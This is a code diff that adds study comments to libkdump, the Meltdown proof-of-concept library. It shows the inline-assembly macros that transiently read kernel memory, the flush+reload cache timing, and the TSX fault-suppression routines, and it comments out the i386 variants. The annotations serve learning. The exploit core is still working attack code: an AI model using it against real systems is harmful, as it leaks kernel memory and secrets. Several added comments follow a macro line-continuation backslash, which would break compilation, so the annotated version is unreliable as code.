@@ -18,7 +18,7 @@ static jmp_buf buf;
 
 static char *_mem = NULL, *mem = NULL;
 static pthread_t *load_thread;
-static size_t phys = 0;
+static size_t phys = 0; //TODO: what is this???
 static int dbg = 0;
 
 static libkdump_config_t config;
@@ -40,23 +40,23 @@ static libkdump_config_t config;
 #warning TSX cannot be forced on __i386__ platform, proceeding with compilation without it
 #endif
 
-#ifdef __x86_64__
+// #ifdef __x86_64__
 
 // ---------------------------------------------------------------------------
 #define meltdown                                                               \
   asm volatile("1:\n"                                                          \
-               "movq (%%rsi), %%rsi\n"                                         \
-               "movzx (%%rcx), %%rax\n"                                         \
-               "shl $12, %%rax\n"                                              \
+               "movq (%%rsi), %%rsi\n"                                         \ // reads 8 bytes at rsi (which is 0?)
+               "movzx (%%rcx), %%rax\n"                                         \// zero-extends the byte at rcx(kernel address) into rax (temp storage)
+               "shl $12, %%rax\n"                                              \ //mult rax by 4096 ( shift binary left by 12)
                "jz 1b\n"                                                       \
-               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
+               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \//syntax, rbs+rax*1 to rbx (read at this memory to create side channel)
                :                                                               \
-               : "c"(phys), "b"(mem), "S"(0)                                   \
-               : "rax");
+               : "c"(phys), "b"(mem), "S"(0)                                   \ //constraints: rcx=phys, rbx=mem, rsi=0
+               : "rax"); // clobbered register
 
 // ---------------------------------------------------------------------------
 #define meltdown_nonull                                                        \
-  asm volatile("1:\n"                                                          \
+  asm volatile("1:\n"                                                          \ //no rsi? TODO: why??
                "movzx (%%rcx), %%rax\n"                                         \
                "shl $12, %%rax\n"                                              \
                "jz 1b\n"                                                       \
@@ -67,47 +67,47 @@ static libkdump_config_t config;
 
 // ---------------------------------------------------------------------------
 #define meltdown_fast                                                          \
-  asm volatile("movzx (%%rcx), %%rax\n"                                         \
+  asm volatile("movzx (%%rcx), %%rax\n"                                         \ //no redo if theses zero
                "shl $12, %%rax\n"                                              \
                "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "rax");
 
-#else /* __i386__ */
+// #else /* __i386__ */
 
-// ---------------------------------------------------------------------------
-#define meltdown                                                               \
- asm volatile("1:\n"                                                           \
-              "movl (%%esi), %%esi\n"                                          \
-              "movzx (%%ecx), %%eax\n"                                          \
-              "shl $12, %%eax\n"                                               \
-              "jz 1b\n"                                                        \
-              "mov (%%ebx,%%eax,1), %%ebx\n"                                   \
-              :                                                                \
-              : "c"(phys), "b"(mem), "S"(0)                                    \
-              : "eax");
+// // ---------------------------------------------------------------------------
+// #define meltdown                                                               \
+//  asm volatile("1:\n"                                                           \
+//               "movl (%%esi), %%esi\n"                                          \
+//               "movzx (%%ecx), %%eax\n"                                          \
+//               "shl $12, %%eax\n"                                               \
+//               "jz 1b\n"                                                        \
+//               "mov (%%ebx,%%eax,1), %%ebx\n"                                   \
+//               :                                                                \
+//               : "c"(phys), "b"(mem), "S"(0)                                    \
+//               : "eax");
 
-// ---------------------------------------------------------------------------
-#define meltdown_nonull                                                        \
-  asm volatile("1:\n"                                                          \
-               "movzx (%%ecx), %%eax\n"                                         \
-               "shl $12, %%eax\n"                                              \
-               "jz 1b\n"                                                       \
-               "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "eax");
+// // ---------------------------------------------------------------------------
+// #define meltdown_nonull                                                        \
+//   asm volatile("1:\n"                                                          \
+//                "movzx (%%ecx), %%eax\n"                                         \
+//                "shl $12, %%eax\n"                                              \
+//                "jz 1b\n"                                                       \
+//                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
+//                :                                                               \
+//                : "c"(phys), "b"(mem)                                           \
+//                : "eax");
 
-// ---------------------------------------------------------------------------
-#define meltdown_fast                                                          \
-  asm volatile("movzx (%%ecx), %%eax\n"                                         \
-               "shl $12, %%eax\n"                                              \
-               "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
-               :                                                               \
-               : "c"(phys), "b"(mem)                                           \
-               : "eax");
-#endif
+// // ---------------------------------------------------------------------------
+// #define meltdown_fast                                                          \
+//   asm volatile("movzx (%%ecx), %%eax\n"                                         \
+//                "shl $12, %%eax\n"                                              \
+//                "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
+//                :                                                               \
+//                : "c"(phys), "b"(mem)                                           \
+//                : "eax");
+// #endif
 
 #ifndef MELTDOWN
 #define MELTDOWN meltdown_nonull
@@ -181,7 +181,7 @@ static void flush(void *p) {
 #endif
 
 // ---------------------------------------------------------------------------
-static int __attribute__((always_inline)) flush_reload(void *ptr) {
+static int __attribute__((always_inline)) flush_reload(void *ptr) { //checks if ptr is in cache
   uint64_t start = 0, end = 0;
 
   start = rdtsc();
@@ -219,7 +219,7 @@ static void *yieldthread(void *dummy) {
 
 #ifndef NO_TSX
 // ---------------------------------------------------------------------------
-static __attribute__((always_inline)) inline unsigned int xbegin(void) {
+static __attribute__((always_inline)) inline unsigned int xbegin(void) { //starts tsx
   unsigned status;
   //asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
   asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
@@ -227,9 +227,9 @@ static __attribute__((always_inline)) inline unsigned int xbegin(void) {
 }
 
 // ---------------------------------------------------------------------------
-static __attribute__((always_inline)) inline void xend(void) {
-  //asm volatile("xend" ::: "memory");
-  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+static __attribute__((always_inline)) inline void xend(void) { //ends tsx
+  //asm volatile("xend" ::: "memory"); 
+  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory"); // 
 }
 #endif
 
@@ -379,11 +379,11 @@ int libkdump_init(const libkdump_config_t configuration) {
     errno = ENOMEM;
     return -1;
   }
-  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
-  memset(mem, 0xab, 4096 * 290);
+  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2); //start of two pages away
+  memset(mem, 0xab, 4096 * 290); //fills 290 pages of ab
 
   for (j = 0; j < 256; j++) {
-    flush(mem + j * 4096);
+    flush(mem + j * 4096); //flush all 256 pages
   }
 
   load_thread = malloc(sizeof(pthread_t) * config.load_threads);
@@ -475,7 +475,7 @@ static int __attribute__((always_inline)) read_value() {
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
+int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() { //read with tsx
 #ifndef NO_TSX
   size_t retries = config.retries + 1;
   uint64_t start = 0, end = 0;
@@ -487,9 +487,9 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_tsx() {
     }
     int i;
     for (i = 0; i < 256; i++) {
-      if (flush_reload(mem + i * 4096)) {
+      if (flush_reload(mem + i * 4096)) { //if this page is in cache
         if (i >= 1) {
-          return i;
+          return i; //address successfully read
         }
       }
       sched_yield();
@@ -525,27 +525,27 @@ int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
 }
 
 // ---------------------------------------------------------------------------
-int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
+int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) { //8 bits of data from addr
   phys = addr;
 
   char res_stat[256];
   int i, j, r;
-  for (i = 0; i < 256; i++)
+  for (i = 0; i < 256; i++) //initialize empty result array?
     res_stat[i] = 0;
 
   sched_yield();
 
   for (i = 0; i < config.measurements; i++) {
-    if (config.fault_handling == TSX) {
-      r = libkdump_read_tsx();
+    if (config.fault_handling == TSX) { //tsx: intel can suppress exceptions (like a try except)
+      r = libkdump_read_tsx(); //r is the value that is read (1 to 256)
     } else {
-      r = libkdump_read_signal_handler();
+      r = libkdump_read_signal_handler(); //if no tsx need special signal handler
     }
     res_stat[r]++;
   }
   int max_v = 0, max_i = 0;
 
-  if (dbg) {
+  if (dbg) { //if debugging print out all results
     for (i = 0; i < sizeof(res_stat); i++) {
       if (res_stat[i] == 0)
         continue;
@@ -554,7 +554,7 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
     }
   }
 
-  for (i = 1; i < 256; i++) {
+  for (i = 1; i < 256; i++) { //which i is most hit
     if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
       max_v = res_stat[i];
       max_i = i;
